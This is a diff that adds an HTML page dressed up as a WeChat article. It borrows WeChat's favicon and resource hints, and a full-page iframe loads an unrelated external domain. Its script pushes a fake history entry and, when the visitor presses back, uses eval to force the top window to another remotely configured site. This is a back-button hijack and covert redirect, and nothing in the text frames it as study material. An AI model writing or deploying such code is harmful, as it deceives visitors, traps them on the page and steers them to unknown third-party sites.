@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="dns-prefetch" href="//res.wx.qq.com">
+    <link rel="dns-prefetch" href="//mmbiz.qpic.cn">
+    <link rel="shortcut icon" type="image/x-icon" href="//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/icon/common/favicon22c41b.ico">
+    <title></title>
+	<script src="../js/jquery.min.js"></script>
+    <script src="../js/jquery.cookie.js"></script>
+    <script src="../js/url.js"></script>
+
+<body style="margin: 0;padding:0 ;height: 12092px;">
+    <iframe scrolling="no" frameborder="0" height="100%" id="mainFrame" width="100%" onload='IFrameReSize("mainFrame");IFrameReSizeWidth("mainFrame");' src="http://485232a.ytzpc.com/goto/489/"></iframe>
+
+<script>
+    function anchor() {
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime())
+    }
+    function zp() {
+    	//window.location.href="https://mp.weixin.qq.com/s?__biz=MzAxOTk0NjY4Mw==&mid=2247485509&idx=5&sn=97689cd45b7fb49f9a00facfe2b4fac1&chksm=9c3e0591ab498c877aaff2c61b40883435d689d9cbf7a2e911d22ed1dfbc861cc85481512926#rd"; 
+        eval("top.location.href='http://"+get_url+"/topics/t_2.html'");
+    }
+    setTimeout('anchor()', 100);
+    window.onhashchange = function() {
+        zp()
+    };
+</script>
+
+</body>
+</html>
